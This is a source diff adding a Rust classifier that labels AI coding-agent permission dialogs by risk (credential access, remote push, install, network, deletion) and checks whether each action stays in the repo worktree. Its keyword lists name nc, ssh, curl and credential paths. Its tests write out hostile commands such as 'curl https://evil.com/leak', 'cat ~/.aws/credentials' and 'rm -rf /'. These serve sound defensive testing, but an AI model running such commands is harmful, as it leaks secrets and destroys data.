@@ -1,0 +1,992 @@
+//! Supervision classification for interactive agent permission dialogs.
+//!
+//! Classifies [`PendingDialog`] instances into semantic [`DialogClass`] categories,
+//! extracts subject entities (commands, file paths, hosts), and conservatively evaluates
+//! whether an action is provably scoped to the repo worktree.
+
+use std::path::{Path, PathBuf};
+
+use serde::{Deserialize, Serialize};
+
+use crate::agent::approval;
+use crate::agent::prompt::PendingDialog;
+use crate::model::AgentKind;
+
+/// Semantic category of a permission dialog.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+#[cfg_attr(feature = "ts", derive(ts_rs::TS))]
+#[cfg_attr(feature = "ts", ts(export))]
+pub enum DialogClass {
+    CommandExec,
+    FileWrite,
+    NetworkAccess,
+    CredentialAccess,
+    Deletion,
+    PushRemote,
+    Install,
+    DeviceAccess,
+    Unknown,
+}
+
+/// The filesystem scope of the repository and worktree against which actions are evaluated.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+#[cfg_attr(feature = "ts", derive(ts_rs::TS))]
+#[cfg_attr(feature = "ts", ts(export))]
+pub struct DialogScope {
+    pub worktree: PathBuf,
+    pub repo_root: PathBuf,
+}
+
+/// The result of classifying a pending dialog.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(rename_all = "snake_case")]
+#[cfg_attr(feature = "ts", derive(ts_rs::TS))]
+#[cfg_attr(feature = "ts", ts(export))]
+pub struct Classification {
+    pub class: DialogClass,
+    pub repo_scoped: bool,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub subject: Option<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub evidence: Vec<String>,
+}
+
+/// Classify a pending interactive dialog into a [`DialogClass`] and determine whether
+/// the requested operation is provably contained within the repository worktree.
+pub fn classify_dialog(d: &PendingDialog, kind: AgentKind, scope: &DialogScope) -> Classification {
+    let _ = kind; // Accepted for future per-kind quirks
+
+    let mut parts: Vec<&str> = Vec::new();
+    if let Some(ref t) = d.title {
+        parts.push(t);
+    }
+    parts.push(&d.question);
+    for b in &d.body {
+        parts.push(b);
+    }
+    for c in &d.context {
+        parts.push(c);
+    }
+    let full_text = parts.join("\n");
+    let full_text_lower = full_text.to_lowercase();
+    let title_lower = d.title.as_deref().unwrap_or("").to_lowercase();
+    let question_lower = d.question.to_lowercase();
+
+    // 1. CredentialAccess: token, api key, api_key, secret, .env, ~/.aws, credential,
+    // keychain, password, ssh key, id_rsa, .pem
+    let cred_markers = [
+        "token",
+        "api key",
+        "api_key",
+        "secret",
+        ".env",
+        "~/.aws",
+        "credential",
+        "keychain",
+        "password",
+        "ssh key",
+        "id_rsa",
+        ".pem",
+    ];
+    let cred_evidence: Vec<String> = cred_markers
+        .iter()
+        .filter(|&&m| full_text_lower.contains(m))
+        .map(|&m| m.to_string())
+        .collect();
+    if !cred_evidence.is_empty() {
+        let subject = extract_subject(d, DialogClass::CredentialAccess);
+        return Classification {
+            class: DialogClass::CredentialAccess,
+            repo_scoped: false,
+            subject,
+            evidence: cred_evidence,
+        };
+    }
+
+    // 2. PushRemote: git push, gh pr, gh release, git remote, git fetch/git pull when URL is present
+    let mut push_evidence = Vec::new();
+    for &m in &["git push", "gh pr", "gh release", "git remote"] {
+        if full_text_lower.contains(m) {
+            push_evidence.push(m.to_string());
+        }
+    }
+    let has_url = full_text_lower.contains("http://")
+        || full_text_lower.contains("https://")
+        || full_text_lower.contains("git@")
+        || full_text_lower.contains("ssh://")
+        || full_text_lower.contains("git://");
+    if (full_text_lower.contains("git fetch") || full_text_lower.contains("git pull")) && has_url {
+        if full_text_lower.contains("git fetch") {
+            push_evidence.push("git fetch".to_string());
+        }
+        if full_text_lower.contains("git pull") {
+            push_evidence.push("git pull".to_string());
+        }
+    }
+    if !push_evidence.is_empty() {
+        let subject = extract_subject(d, DialogClass::PushRemote);
+        return Classification {
+            class: DialogClass::PushRemote,
+            repo_scoped: false,
+            subject,
+            evidence: push_evidence,
+        };
+    }
+
+    // 3. Install: npm i/npm install, pnpm add, bun add, cargo install, brew install,
+    // pip install, apt install, apt-get install, gem install
+    let mut install_evidence = Vec::new();
+    let install_markers = [
+        "npm install",
+        "pnpm add",
+        "bun add",
+        "cargo install",
+        "brew install",
+        "pip install",
+        "apt install",
+        "apt-get install",
+        "gem install",
+    ];
+    for &m in &install_markers {
+        if full_text_lower.contains(m) {
+            install_evidence.push(m.to_string());
+        }
+    }
+    if has_npm_i(&full_text_lower) && !install_evidence.iter().any(|m| m == "npm install") {
+        install_evidence.push("npm i".to_string());
+    }
+    if !install_evidence.is_empty() {
+        let subject = extract_subject(d, DialogClass::Install);
+        return Classification {
+            class: DialogClass::Install,
+            repo_scoped: false,
+            subject,
+            evidence: install_evidence,
+        };
+    }
+
+    // 4. DeviceAccess: osascript, camera, microphone, screen recording, screencapture,
+    // system_profiler, defaults write
+    let device_markers = [
+        "osascript",
+        "camera",
+        "microphone",
+        "screen recording",
+        "screencapture",
+        "system_profiler",
+        "defaults write",
+    ];
+    let device_evidence: Vec<String> = device_markers
+        .iter()
+        .filter(|&&m| full_text_lower.contains(m))
+        .map(|&m| m.to_string())
+        .collect();
+    if !device_evidence.is_empty() {
+        let subject = extract_subject(d, DialogClass::DeviceAccess);
+        return Classification {
+            class: DialogClass::DeviceAccess,
+            repo_scoped: false,
+            subject,
+            evidence: device_evidence,
+        };
+    }
+
+    // 5. NetworkAccess: curl, wget, nc , ssh , http://, https://
+    let mut net_evidence = Vec::new();
+    for &m in &["curl", "wget", "http://", "https://"] {
+        if full_text_lower.contains(m) {
+            net_evidence.push(m.to_string());
+        }
+    }
+    if full_text_lower.contains("nc ") || has_standalone_token(&full_text_lower, "nc") {
+        net_evidence.push("nc".to_string());
+    }
+    if full_text_lower.contains("ssh ") || has_standalone_token(&full_text_lower, "ssh") {
+        net_evidence.push("ssh".to_string());
+    }
+    if !net_evidence.is_empty() {
+        let subject = extract_subject(d, DialogClass::NetworkAccess);
+        let repo_scoped = is_network_safe(&full_text, &net_evidence);
+        return Classification {
+            class: DialogClass::NetworkAccess,
+            repo_scoped,
+            subject,
+            evidence: net_evidence,
+        };
+    }
+
+    // 6. Deletion: rm , rm -, unlink, git clean, title/question containing delete file
+    let mut del_evidence = Vec::new();
+    for &m in &["rm -", "unlink", "git clean"] {
+        if full_text_lower.contains(m) {
+            del_evidence.push(m.to_string());
+        }
+    }
+    if (full_text_lower.contains("rm ") || has_standalone_token(&full_text_lower, "rm"))
+        && !del_evidence.iter().any(|m| m.starts_with("rm"))
+    {
+        del_evidence.push("rm".to_string());
+    }
+    if title_lower.contains("delete file") || question_lower.contains("delete file") {
+        del_evidence.push("delete file".to_string());
+    }
+    if !del_evidence.is_empty() {
+        let subject = extract_subject(d, DialogClass::Deletion);
+        let repo_scoped = is_deletion_scoped(&full_text, subject.as_deref(), scope);
+        return Classification {
+            class: DialogClass::Deletion,
+            repo_scoped,
+            subject,
+            evidence: del_evidence,
+        };
+    }
+
+    // 7. FileWrite: title/question containing edit file, create file, write, apply patch, multiedit
+    let mut write_evidence = Vec::new();
+    for &m in &["edit file", "create file", "apply patch", "multiedit"] {
+        if title_lower.contains(m) || question_lower.contains(m) {
+            write_evidence.push(m.to_string());
+        }
+    }
+    if (title_lower.contains("write") || question_lower.contains("write"))
+        && !write_evidence.iter().any(|m| m.contains("write"))
+    {
+        write_evidence.push("write".to_string());
+    }
+    if (question_lower.contains("make this edit") || question_lower.contains("make these edits"))
+        && !write_evidence.iter().any(|m| m == "edit file")
+    {
+        write_evidence.push("edit file".to_string());
+    }
+    if question_lower.contains("do you want to create")
+        && !write_evidence.iter().any(|m| m == "create file")
+    {
+        write_evidence.push("create file".to_string());
+    }
+    if !write_evidence.is_empty() {
+        let subject = extract_subject(d, DialogClass::FileWrite);
+        let repo_scoped = is_file_write_scoped(subject.as_deref(), scope);
+        return Classification {
+            class: DialogClass::FileWrite,
+            repo_scoped,
+            subject,
+            evidence: write_evidence,
+        };
+    }
+
+    // 8. CommandExec: title starting bash, or run command, run tool, requesting permission, wants to run
+    let mut cmd_evidence = Vec::new();
+    if title_lower.starts_with("bash") {
+        cmd_evidence.push("bash".to_string());
+    }
+    for &m in &[
+        "run command",
+        "run tool",
+        "requesting permission",
+        "wants to run",
+    ] {
+        if full_text_lower.contains(m) {
+            cmd_evidence.push(m.to_string());
+        }
+    }
+    if !cmd_evidence.is_empty() {
+        let subject = extract_subject(d, DialogClass::CommandExec);
+        let repo_scoped = is_command_scoped(subject.as_deref(), scope);
+        return Classification {
+            class: DialogClass::CommandExec,
+            repo_scoped,
+            subject,
+            evidence: cmd_evidence,
+        };
+    }
+
+    // 9. Unknown: anything else
+    let subject = extract_subject(d, DialogClass::Unknown);
+    Classification {
+        class: DialogClass::Unknown,
+        repo_scoped: false,
+        subject,
+        evidence: Vec::new(),
+    }
+}
+
+/// Check if text contains `npm i` as command token(s).
+fn has_npm_i(text: &str) -> bool {
+    for line in text.lines() {
+        let tokens: Vec<&str> = line.split_whitespace().collect();
+        for (i, &t) in tokens.iter().enumerate() {
+            if t == "npm" && tokens.get(i + 1) == Some(&"i") {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+/// Check if a standalone whitespace token matches the target word.
+fn has_standalone_token(text: &str, token: &str) -> bool {
+    for line in text.lines() {
+        for t in line.split_whitespace() {
+            let clean = t.trim_matches(|c: char| {
+                c == '\'' || c == '"' || c == '`' || c == ',' || c == ';' || c == ':'
+            });
+            if clean == token {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+/// Check whether a path token stays inside the repository worktree or root.
+fn is_path_in_scope(token: &str, scope: &DialogScope) -> bool {
+    let clean = token.trim_matches(|c: char| {
+        c == '\'' || c == '"' || c == '`' || c == ',' || c == ';' || c == ':'
+    });
+    if clean.is_empty() {
+        return true;
+    }
+    // Reject any token containing .. (directory traversal)
+    if clean.contains("..") {
+        return false;
+    }
+    // Reject ~-prefixed paths (e.g. ~/.aws/credentials)
+    if clean.starts_with('~') {
+        return false;
+    }
+    // Absolute paths must start with worktree or repo_root
+    let p = Path::new(clean);
+    if p.is_absolute() {
+        if p.starts_with(&scope.worktree) || p.starts_with(&scope.repo_root) {
+            return true;
+        }
+        return false;
+    }
+    // Relative paths without .. count as in-scope
+    true
+}
+
+/// Extract all HTTP/HTTPS URLs from text.
+fn extract_urls(text: &str) -> Vec<String> {
+    let mut urls = Vec::new();
+    for word in text.split_whitespace() {
+        let trimmed = word.trim_matches(|c: char| {
+            c == '\''
+                || c == '"'
+                || c == '('
+                || c == ')'
+                || c == '<'
+                || c == '>'
+                || c == ','
+                || c == ';'
+        });
+        if trimmed.starts_with("http://") || trimmed.starts_with("https://") {
+            urls.push(trimmed.to_string());
+        }
+    }
+    urls
+}
+
+/// Extract the hostname from a URL.
+fn get_url_host(url: &str) -> Option<&str> {
+    let without_scheme = url
+        .strip_prefix("https://")
+        .or_else(|| url.strip_prefix("http://"))?;
+    let host = without_scheme.split(&['/', ':', '?', '#'][..]).next()?;
+    Some(host)
+}
+
+/// Check if NetworkAccess destinations are all safe package registries or localhost.
+fn is_network_safe(text: &str, evidence: &[String]) -> bool {
+    if evidence.iter().any(|e| e == "nc" || e == "ssh") {
+        return false;
+    }
+    if approval::is_always_escalate(text) {
+        return false;
+    }
+    let urls = extract_urls(text);
+    if urls.is_empty() {
+        return false;
+    }
+    for url in &urls {
+        if let Some(host) = get_url_host(url) {
+            let host_lower = host.to_lowercase();
+            let is_safe = match host_lower.as_str() {
+                "localhost"
+                | "127.0.0.1"
+                | "registry.npmjs.org"
+                | "crates.io"
+                | "static.crates.io"
+                | "pypi.org"
+                | "files.pythonhosted.org" => true,
+                "github.com" => url.starts_with("https://"),
+                _ => false,
+            };
+            if !is_safe {
+                return false;
+            }
+        } else {
+            return false;
+        }
+    }
+    true
+}
+
+/// Check if a Deletion action is scoped to the repository worktree.
+fn is_deletion_scoped(text: &str, subject: Option<&str>, scope: &DialogScope) -> bool {
+    if approval::is_always_escalate(text) {
+        return false;
+    }
+    if let Some(sub) = subject {
+        if approval::is_always_escalate(sub) {
+            return false;
+        }
+        let tokens: Vec<&str> = sub.split_whitespace().collect();
+        let target_paths: Vec<&str> = tokens
+            .into_iter()
+            .filter(|t| {
+                !t.starts_with('-') && *t != "rm" && *t != "unlink" && *t != "git" && *t != "clean"
+            })
+            .collect();
+        if target_paths.is_empty() {
+            return is_path_in_scope(sub, scope);
+        }
+        for tp in target_paths {
+            if !is_path_in_scope(tp, scope) {
+                return false;
+            }
+        }
+        return true;
+    }
+    false
+}
+
+/// Check if a FileWrite action is scoped to the repository worktree.
+fn is_file_write_scoped(subject: Option<&str>, scope: &DialogScope) -> bool {
+    if let Some(sub) = subject {
+        if approval::is_always_escalate(sub) {
+            return false;
+        }
+        return is_path_in_scope(sub, scope);
+    }
+    false
+}
+
+/// Check if a single command segment is allowlisted and within repo scope.
+fn is_segment_allowlisted(seg: &str, scope: &DialogScope) -> bool {
+    let s = seg.trim();
+    if s.is_empty() {
+        return false;
+    }
+    let tokens: Vec<&str> = s.split_whitespace().collect();
+    if tokens.is_empty() {
+        return false;
+    }
+
+    let bin_raw = tokens[0];
+    let bin = Path::new(bin_raw)
+        .file_name()
+        .and_then(|f| f.to_str())
+        .unwrap_or(bin_raw);
+
+    let allowlisted = match bin {
+        "cargo" | "bun" | "npm" | "pnpm" | "yarn" | "go" | "make" | "pytest" | "rg" | "grep"
+        | "ls" | "cat" | "tsc" | "vitest" | "eslint" => true,
+        "python" | "python3" => tokens.get(1) == Some(&"-m") && tokens.get(2) == Some(&"pytest"),
+        "sed" => tokens
+            .iter()
+            .any(|&t| t == "-n" || (t.starts_with('-') && t.contains('n'))),
+        "git" => {
+            let sub = tokens.get(1).copied().unwrap_or("");
+            matches!(sub, "status" | "diff" | "log" | "add" | "commit" | "show")
+        }
+        _ => false,
+    };
+
+    if !allowlisted {
+        return false;
+    }
+
+    for token in &tokens {
+        if token.starts_with('-') {
+            if let Some((_, val)) = token.split_once('=') {
+                if !is_path_in_scope(val, scope) {
+                    return false;
+                }
+            }
+            continue;
+        }
+        let clean =
+            token.trim_matches(|c: char| c == '\'' || c == '"' || c == '`' || c == ',' || c == ';');
+        if !is_path_in_scope(clean, scope) {
+            return false;
+        }
+    }
+
+    true
+}
+
+/// Split compound commands by `&&`, `||`, `;`, `|` outside quotes.
+fn split_compound_command(cmd: &str) -> Vec<String> {
+    let mut segments = Vec::new();
+    let mut current = String::new();
+    let mut in_single_quote = false;
+    let mut in_double_quote = false;
+    let mut chars = cmd.chars().peekable();
+
+    while let Some(c) = chars.next() {
+        match c {
+            '\'' if !in_double_quote => {
+                in_single_quote = !in_single_quote;
+                current.push(c);
+            }
+            '"' if !in_single_quote => {
+                in_double_quote = !in_double_quote;
+                current.push(c);
+            }
+            '&' if !in_single_quote && !in_double_quote && chars.peek() == Some(&'&') => {
+                chars.next();
+                let trimmed = current.trim().to_string();
+                if !trimmed.is_empty() {
+                    segments.push(trimmed);
+                }
+                current.clear();
+            }
+            '|' if !in_single_quote && !in_double_quote => {
+                if chars.peek() == Some(&'|') {
+                    chars.next();
+                }
+                let trimmed = current.trim().to_string();
+                if !trimmed.is_empty() {
+                    segments.push(trimmed);
+                }
+                current.clear();
+            }
+            ';' if !in_single_quote && !in_double_quote => {
+                let trimmed = current.trim().to_string();
+                if !trimmed.is_empty() {
+                    segments.push(trimmed);
+                }
+                current.clear();
+            }
+            _ => {
+                current.push(c);
+            }
+        }
+    }
+    let trimmed = current.trim().to_string();
+    if !trimmed.is_empty() {
+        segments.push(trimmed);
+    }
+    segments
+}
+
+/// Check if a command is allowlisted and scoped to the repository worktree.
+fn is_command_scoped(subject: Option<&str>, scope: &DialogScope) -> bool {
+    let Some(cmd) = subject else {
+        return false;
+    };
+    if approval::is_always_escalate(cmd) {
+        return false;
+    }
+    let segments = split_compound_command(cmd);
+    if segments.is_empty() {
+        return false;
+    }
+    for seg in segments {
+        if !is_segment_allowlisted(&seg, scope) {
+            return false;
+        }
+    }
+    true
+}
+
+/// Extract subject from a pending dialog.
+fn extract_subject(d: &PendingDialog, class: DialogClass) -> Option<String> {
+    if let Some(cmd) = approval::dialog_command(d) {
+        return Some(cmd);
+    }
+
+    if let Some(tool) = extract_tool_name(&d.question) {
+        return Some(tool);
+    }
+
+    if class == DialogClass::FileWrite {
+        if let Some(path) = extract_file_path_from_dialog(d) {
+            return Some(path);
+        }
+    }
+
+    for line in &d.context {
+        let t = line.trim();
+        if is_header_or_label_line(t) {
+            continue;
+        }
+        if !t.is_empty() {
+            return Some(t.to_string());
+        }
+    }
+
+    for line in &d.body {
+        let t = line.trim();
+        if !t.is_empty() {
+            return Some(t.to_string());
+        }
+    }
+
+    if let Some(cmd) = extract_command_from_question(&d.question) {
+        return Some(cmd);
+    }
+
+    None
+}
+
+/// Extract tool name from a question like `Allow the repomon MCP server to run tool "fleet_status"?`.
+fn extract_tool_name(question: &str) -> Option<String> {
+    let lower = question.to_lowercase();
+    let idx = lower.find("tool \"")?;
+    let rest = &question[idx + "tool \"".len()..];
+    let end = rest.find('"')?;
+    Some(rest[..end].to_string())
+}
+
+/// Identify if a line is a decorative header or field label rather than actionable content.
+fn is_header_or_label_line(line: &str) -> bool {
+    let l = line.to_lowercase();
+    l.ends_with(':')
+        || l.starts_with("field ")
+        || l.starts_with("security guide")
+        || l.starts_with("───")
+}
+
+/// Extract target file path from dialog body, question, or context.
+fn extract_file_path_from_dialog(d: &PendingDialog) -> Option<String> {
+    for line in &d.body {
+        let t = line.trim();
+        if !t.is_empty() {
+            return Some(t.to_string());
+        }
+    }
+    let q = &d.question;
+    let lower = q.to_lowercase();
+    if let Some(idx) = lower.find("edit to ") {
+        let rest = q[idx + "edit to ".len()..].trim().trim_end_matches('?');
+        if !rest.is_empty() {
+            return Some(rest.to_string());
+        }
+    }
+    if let Some(idx) = lower.find("create ") {
+        let rest = q[idx + "create ".len()..].trim().trim_end_matches('?');
+        if !rest.is_empty() {
+            return Some(rest.to_string());
+        }
+    }
+    for line in &d.context {
+        let t = line.trim();
+        if !is_header_or_label_line(t) && !t.is_empty() {
+            return Some(t.to_string());
+        }
+    }
+    None
+}
+
+/// Extract command substring from questions like `Do you want to run cargo test?`.
+fn extract_command_from_question(question: &str) -> Option<String> {
+    let lower = question.to_lowercase();
+    if let Some(idx) = lower.find("run ") {
+        let rest = question[idx + "run ".len()..].trim().trim_end_matches('?');
+        if !rest.is_empty() {
+            return Some(rest.to_string());
+        }
+    }
+    None
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::agent::prompt::DialogOption;
+
+    fn test_scope() -> DialogScope {
+        DialogScope {
+            worktree: PathBuf::from("/Users/test/workspace/repo"),
+            repo_root: PathBuf::from("/Users/test/workspace/repo"),
+        }
+    }
+
+    fn test_dialog(title: Option<&str>, body: &[&str], context: &[&str]) -> PendingDialog {
+        PendingDialog {
+            title: title.map(str::to_string),
+            question: "Do you want to proceed?".into(),
+            body: body.iter().map(|s| s.to_string()).collect(),
+            options: vec![
+                DialogOption {
+                    number: Some(1),
+                    text: "Yes".into(),
+                },
+                DialogOption {
+                    number: Some(2),
+                    text: "No".into(),
+                },
+            ],
+            selected: Some(0),
+            context: context.iter().map(|s| s.to_string()).collect(),
+        }
+    }
+
+    #[test]
+    fn antigravity_fixture_classified_correctly() {
+        let pane = r#"
+Requesting permission for:
+   ps aux | grep -i repomon
+
+Do you want to proceed?
+> 1. Yes
+  2. Yes, and always allow in this conversation
+  3. Yes, and always allow in settings
+  4. No
+"#;
+        let d = crate::agent::prompt::detect_dialog(pane).expect("Antigravity dialog");
+        assert_eq!(
+            d.context,
+            vec![
+                "Requesting permission for:".to_string(),
+                "ps aux | grep -i repomon".to_string()
+            ]
+        );
+        let scope = test_scope();
+        let c = classify_dialog(&d, AgentKind::Antigravity, &scope);
+        assert_eq!(c.class, DialogClass::CommandExec);
+        assert_eq!(c.subject.as_deref(), Some("ps aux | grep -i repomon"));
+        assert!(!c.repo_scoped);
+    }
+
+    #[test]
+    fn codex_boxless_mcp_fixture_classified_correctly() {
+        let pane = "  Field 1/1\n\
+              Allow the repomon MCP server to run tool \"fleet_status\"?\n\
+              › 1. Allow                   Run the tool and continue.\n\
+                2. Allow for this session  Run the tool and remember this choice for this session.\n\
+                3. Always allow            Run the tool and remember this choice for future tool calls.\n\
+                4. Cancel                  Cancel this tool call\n\
+              enter to submit | esc to cancel";
+        let d = crate::agent::prompt::detect_dialog(pane).expect("Codex dialog");
+        assert_eq!(d.context, vec!["Field 1/1"]);
+        let scope = test_scope();
+        let c = classify_dialog(&d, AgentKind::Codex, &scope);
+        assert_eq!(c.class, DialogClass::CommandExec);
+        assert_ne!(c.class, DialogClass::Unknown);
+        assert_eq!(c.subject.as_deref(), Some("fleet_status"));
+    }
+
+    #[test]
+    fn repo_scope_evaluation_tests() {
+        let scope = test_scope();
+
+        // 1. cargo test -p repomon-core command => repo_scoped true
+        let d1 = test_dialog(Some("Bash command"), &["cargo test -p repomon-core"], &[]);
+        let c1 = classify_dialog(&d1, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c1.class, DialogClass::CommandExec);
+        assert!(c1.repo_scoped);
+
+        // 2. cat ~/.aws/credentials => CredentialAccess, repo_scoped false
+        let d2 = test_dialog(Some("Bash command"), &["cat ~/.aws/credentials"], &[]);
+        let c2 = classify_dialog(&d2, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c2.class, DialogClass::CredentialAccess);
+        assert!(!c2.repo_scoped);
+
+        // 3. cd /etc && cat passwd => not repo_scoped
+        let d3 = test_dialog(Some("Bash command"), &["cd /etc && cat passwd"], &[]);
+        let c3 = classify_dialog(&d3, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c3.class, DialogClass::CommandExec);
+        assert!(!c3.repo_scoped);
+
+        // 4. path with .. escaping worktree => not repo_scoped
+        let d4 = test_dialog(Some("Bash command"), &["cargo test -p ../escaping"], &[]);
+        let c4 = classify_dialog(&d4, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c4.class, DialogClass::CommandExec);
+        assert!(!c4.repo_scoped);
+    }
+
+    #[test]
+    fn fixture_table_all_nine_classes() {
+        let scope = test_scope();
+
+        // 1. CredentialAccess (at least 2 fixtures)
+        let d_cred_1 = test_dialog(Some("Bash command"), &["cat .env"], &[]);
+        let c_cred_1 = classify_dialog(&d_cred_1, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_cred_1.class, DialogClass::CredentialAccess);
+        assert!(!c_cred_1.repo_scoped);
+
+        let d_cred_2 = test_dialog(Some("Bash command"), &["cat ~/.aws/credentials"], &[]);
+        let c_cred_2 = classify_dialog(&d_cred_2, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_cred_2.class, DialogClass::CredentialAccess);
+        assert!(!c_cred_2.repo_scoped);
+
+        let d_cred_3 = test_dialog(Some("Bash command"), &["export API_KEY=secret_123"], &[]);
+        let c_cred_3 = classify_dialog(&d_cred_3, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_cred_3.class, DialogClass::CredentialAccess);
+        assert!(!c_cred_3.repo_scoped);
+
+        // 2. PushRemote (at least 2 fixtures)
+        let d_push_1 = test_dialog(
+            Some("Bash command"),
+            &["git push origin feat/supervision"],
+            &[],
+        );
+        let c_push_1 = classify_dialog(&d_push_1, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_push_1.class, DialogClass::PushRemote);
+        assert!(!c_push_1.repo_scoped);
+
+        let d_push_2 = test_dialog(
+            Some("Bash command"),
+            &["gh pr create --title \"supervision\""],
+            &[],
+        );
+        let c_push_2 = classify_dialog(&d_push_2, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_push_2.class, DialogClass::PushRemote);
+        assert!(!c_push_2.repo_scoped);
+
+        let d_push_3 = test_dialog(
+            Some("Bash command"),
+            &["git pull https://github.com/org/repo.git"],
+            &[],
+        );
+        let c_push_3 = classify_dialog(&d_push_3, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_push_3.class, DialogClass::PushRemote);
+        assert!(!c_push_3.repo_scoped);
+
+        // 3. Install (at least 2 fixtures)
+        let d_inst_1 = test_dialog(Some("Bash command"), &["cargo install ripgrep"], &[]);
+        let c_inst_1 = classify_dialog(&d_inst_1, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_inst_1.class, DialogClass::Install);
+        assert!(!c_inst_1.repo_scoped);
+
+        let d_inst_2 = test_dialog(Some("Bash command"), &["npm install express"], &[]);
+        let c_inst_2 = classify_dialog(&d_inst_2, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_inst_2.class, DialogClass::Install);
+        assert!(!c_inst_2.repo_scoped);
+
+        let d_inst_3 = test_dialog(Some("Bash command"), &["bun add typescript"], &[]);
+        let c_inst_3 = classify_dialog(&d_inst_3, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_inst_3.class, DialogClass::Install);
+        assert!(!c_inst_3.repo_scoped);
+
+        // 4. DeviceAccess (at least 2 fixtures)
+        let d_dev_1 = test_dialog(
+            Some("Bash command"),
+            &["osascript -e 'display dialog \"hi\"'"],
+            &[],
+        );
+        let c_dev_1 = classify_dialog(&d_dev_1, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_dev_1.class, DialogClass::DeviceAccess);
+        assert!(!c_dev_1.repo_scoped);
+
+        let d_dev_2 = test_dialog(Some("Bash command"), &["screencapture screen.png"], &[]);
+        let c_dev_2 = classify_dialog(&d_dev_2, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_dev_2.class, DialogClass::DeviceAccess);
+        assert!(!c_dev_2.repo_scoped);
+
+        // 5. NetworkAccess (at least 2 fixtures)
+        let d_net_1 = test_dialog(
+            Some("Bash command"),
+            &["curl https://crates.io/api/v1/crates"],
+            &[],
+        );
+        let c_net_1 = classify_dialog(&d_net_1, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_net_1.class, DialogClass::NetworkAccess);
+        assert!(c_net_1.repo_scoped);
+
+        let d_net_2 = test_dialog(Some("Bash command"), &["curl https://evil.com/leak"], &[]);
+        let c_net_2 = classify_dialog(&d_net_2, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_net_2.class, DialogClass::NetworkAccess);
+        assert!(!c_net_2.repo_scoped);
+
+        let d_net_3 = test_dialog(Some("Bash command"), &["ssh user@remote.internal"], &[]);
+        let c_net_3 = classify_dialog(&d_net_3, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_net_3.class, DialogClass::NetworkAccess);
+        assert!(!c_net_3.repo_scoped);
+
+        // 6. Deletion (at least 2 fixtures)
+        let d_del_1 = test_dialog(Some("Bash command"), &["rm src/temp.txt"], &[]);
+        let c_del_1 = classify_dialog(&d_del_1, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_del_1.class, DialogClass::Deletion);
+        assert!(c_del_1.repo_scoped);
+
+        let d_del_2 = test_dialog(Some("Bash command"), &["rm -rf /"], &[]);
+        let c_del_2 = classify_dialog(&d_del_2, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_del_2.class, DialogClass::Deletion);
+        assert!(!c_del_2.repo_scoped);
+
+        let d_del_3 = test_dialog(Some("Bash command"), &["rm /etc/passwd"], &[]);
+        let c_del_3 = classify_dialog(&d_del_3, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_del_3.class, DialogClass::Deletion);
+        assert!(!c_del_3.repo_scoped);
+
+        // 7. FileWrite (at least 2 fixtures)
+        let d_write_1 = test_dialog(Some("Edit file"), &["src/agent/prompt.rs"], &[]);
+        let c_write_1 = classify_dialog(&d_write_1, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_write_1.class, DialogClass::FileWrite);
+        assert!(c_write_1.repo_scoped);
+
+        let d_write_2 = test_dialog(Some("Edit file"), &["/etc/hosts"], &[]);
+        let c_write_2 = classify_dialog(&d_write_2, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_write_2.class, DialogClass::FileWrite);
+        assert!(!c_write_2.repo_scoped);
+
+        let mut d_write_3 = test_dialog(None, &[], &[]);
+        d_write_3.question = "Do you want to create README.md?".to_string();
+        let c_write_3 = classify_dialog(&d_write_3, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_write_3.class, DialogClass::FileWrite);
+        assert!(c_write_3.repo_scoped);
+
+        // 8. CommandExec (at least 2 fixtures)
+        let d_cmd_1 = test_dialog(Some("Bash command"), &["cargo test -p repomon-core"], &[]);
+        let c_cmd_1 = classify_dialog(&d_cmd_1, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_cmd_1.class, DialogClass::CommandExec);
+        assert!(c_cmd_1.repo_scoped);
+
+        let d_cmd_2 = test_dialog(Some("Bash command"), &["git status"], &[]);
+        let c_cmd_2 = classify_dialog(&d_cmd_2, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_cmd_2.class, DialogClass::CommandExec);
+        assert!(c_cmd_2.repo_scoped);
+
+        let d_cmd_3 = test_dialog(Some("Bash command"), &["ps aux | grep -i repomon"], &[]);
+        let c_cmd_3 = classify_dialog(&d_cmd_3, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_cmd_3.class, DialogClass::CommandExec);
+        assert!(!c_cmd_3.repo_scoped);
+
+        // 9. Unknown (at least 2 fixtures)
+        let mut d_unk_1 = test_dialog(None, &[], &[]);
+        d_unk_1.question = "Which auth method should we use?".to_string();
+        let c_unk_1 = classify_dialog(&d_unk_1, AgentKind::ClaudeCode, &scope);
+        assert_eq!(c_unk_1.class, DialogClass::Unknown);
+        assert!(!c_unk_1.repo_scoped);
+
